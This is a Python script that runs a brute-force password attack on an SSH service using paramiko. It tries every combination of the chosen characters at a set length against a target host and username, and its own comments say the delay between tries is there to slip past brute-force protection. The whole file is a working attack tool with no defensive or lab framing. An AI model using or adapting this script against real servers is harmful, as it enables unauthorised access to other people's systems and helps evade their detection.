import paramiko
import time
from itertools import product
import string

# Function to perform brute force attack on SSH
def brute_force_ssh(ip, port, username, password_length=4, use_uppercase=False, use_special_chars=False, delay=1):
    """
    This function attempts a brute-force attack on an SSH service.
    
    :param ip: The target IP address of the SSH service
    :param port: The port number (default is 22 for SSH)
    :param username: The username to attempt login with
    :param password_length: The length of the password to try (default is 4)
    :param use_uppercase: Whether to include uppercase letters in the password (default is False)
    :param use_special_chars: Whether to include special characters in the password (default is False)
    :param delay: Delay between attempts to avoid triggering brute force protection (default is 1 second)
    """
    # Define the character set for brute-forcing
    chars = string.ascii_lowercase + string.digits  # Lowercase letters and digits by default
    
    # If the user wants to include uppercase letters, add them to the character set
    if use_uppercase:
        chars += string.ascii_uppercase
    
    # If the user wants to include special characters, add them to the character set
    if use_special_chars:
        chars += string.punctuation

    # Try all possible combinations of the specified password length
    print(f"Starting brute-force attack on {ip} with username '{username}' and password length {password_length}")
    for password in product(chars, repeat=password_length):
        password = ''.join(password)
        
        try:
            # Establish an SSH connection using Paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add the SSH host key
            ssh.connect(ip, port=port, username=username, password=password)
            
            # If the connection is successful, print the found password and close the connection
            print(f"Password found: {password}")
            ssh.close()
            break  # Exit the loop once the password is found
            
        except paramiko.AuthenticationException:
            # If the authentication fails, continue with the next password
            pass
        except Exception as e:
            # Print any other error and stop the script
            print(f"Error: {e}")
            break
        
        # Delay to avoid detection by brute force protection mechanisms
        time.sleep(delay)

# Example usage
if __name__ == "__main__":
    brute_force_ssh('192.168.1.100', 22, 'admin', password_length=4, use_uppercase=True, use_special_chars=True, delay=1)
